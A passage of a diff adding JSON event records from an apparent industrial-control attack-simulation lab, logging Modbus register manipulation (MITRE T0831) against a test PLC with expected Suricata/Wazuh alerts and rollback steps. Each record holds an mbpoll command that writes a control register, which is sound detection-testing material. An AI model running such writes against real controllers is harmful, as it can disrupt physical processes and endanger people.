+        "target_image": "ubuntu-22.04",
+        "effective_target_basis": "attack_result_target",
+        "target_resolution_note": null
+      },
+      "operation": {
+        "tool_used": "attack_executor",
+        "tool_version": null,
+        "protocol": "modbus_tcp",
+        "target_port": 502,
+        "modbus_function": "16",
+        "register_reference": 4,
+        "value": 30,
+        "slave_id": 1,
+        "data_type": "4:int",
+        "parameters": {},
+        "expected_alerts": [
+          "modbus_write_register",
+          "unauthorized_control_command",
+          "process_state_change",
+          "control_manipulation"
+        ],
+        "rollback_required": true,
+        "rollback_command": "mbpoll -m tcp -a 1 -r 4 -t 4:int -1 192.168.100.252 50",
+        "command": "mbpoll -m tcp -a 1 -r 4 -t 4:int -1 192.168.100.252 30",
+        "modbus_operation": "write",
+        "expected_effect": "plc_register_state_change",
+        "expected_plc_state_change": "register_4 -> 30"
+      },
+      "execution_interpretation": {
+        "status_classification": "executed_successful",
+        "status_note": null
+      },
+      "execution_status": "completed",
+      "source_reference": "app_core/infrastructure/attack/outputs/20260702T162448Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/result.json",
+      "evidence_references": [
+        "app_core/infrastructure/attack/outputs/20260702T162448Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/result.json",
+        "app_core/infrastructure/attack/outputs/20260702T162448Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/modbus_transaction_log.json",
+        "app_core/infrastructure/attack/outputs/20260702T162448Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/plc_state_before.json",
+        "app_core/infrastructure/attack/outputs/20260702T162448Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/plc_state_after.json",
+        "app_core/infrastructure/attack/outputs/20260702T162448Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/rollback_log.json"
+      ]
+    },
+    {
+      "attack_event_id": "evt-0f85518e",
+      "attack_id": "atk-6402b8e1",
+      "attack_name": "Modbus Register Manipulation",
+      "scenario_id": "scn-b83dbbfb",
+      "scenario_name": "industrial_file",
+      "display_name": "Modbus Register Manipulation",
+      "mitre": {
+        "domain": "ICS",
+        "technique_id": "T0831",
+        "technique_name": "Manipulation of Control",
+        "tactic": "Impair Process Control"
+      },
+      "execution": {
+        "started_at": "2026-07-02T20:28:12.870901+00:00",
+        "completed_at": "2026-07-02T20:28:34.517295+00:00",
+        "success": true,
+        "exit_code": 0,
+        "execution_mode": "restore_by_default",
+        "detection_engine": "Suricata + Wazuh",
+        "success_criteria": "state_changed_and_observed"
+      },
+      "attacker": {
+        "ip": "10.0.2.214",
+        "user": "ubuntu"
+      },
+      "target": {
+        "node_id": "node-f9ca9bfc",
+        "instance_id": "inst-8c0c86c9",
+        "instance_name": "PLC_Instance",
+        "node_name": "PLC",
+        "target_role": "plc",
+        "effective_target_role": "PLC",
+        "target_ip": "192.168.100.252",
+        "target_image": "ubuntu-22.04",
+        "effective_target_basis": "attack_result_target",
+        "target_resolution_note": null
+      },
+      "operation": {
+        "tool_used": "attack_executor",
+        "tool_version": null,
+        "protocol": "modbus_tcp",
+        "target_port": 502,
+        "modbus_function": "16",
+        "register_reference": 4,
+        "value": 30,
+        "slave_id": 1,
+        "data_type": "4:int",
+        "parameters": {},
+        "expected_alerts": [
+          "modbus_write_register",
+          "unauthorized_control_command",
+          "process_state_change",
+          "control_manipulation"
+        ],
+        "rollback_required": true,
+        "rollback_command": "mbpoll -m tcp -a 1 -r 4 -t 4:int -1 192.168.100.252 50",
+        "command": "mbpoll -m tcp -a 1 -r 4 -t 4:int -1 192.168.100.252 30",
+        "modbus_operation": "write",
+        "expected_effect": "plc_register_state_change",
+        "expected_plc_state_change": "register_4 -> 30"
+      },
+      "execution_interpretation": {
+        "status_classification": "executed_successful",
+        "status_note": null
+      },
+      "execution_status": "completed",
+      "source_reference": "app_core/infrastructure/attack/outputs/20260702T202812Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/result.json",
+      "evidence_references": [
+        "app_core/infrastructure/attack/outputs/20260702T202812Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/result.json",
+        "app_core/infrastructure/attack/outputs/20260702T202812Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/modbus_transaction_log.json",
+        "app_core/infrastructure/attack/outputs/20260702T202812Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/plc_state_before.json",
+        "app_core/infrastructure/attack/outputs/20260702T202812Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/plc_state_after.json",
+        "app_core/infrastructure/attack/outputs/20260702T202812Z_T0831_MANIPULATION_OF_CONTROL_MODBUS/rollback_log.json"
       ]
     }
   ]
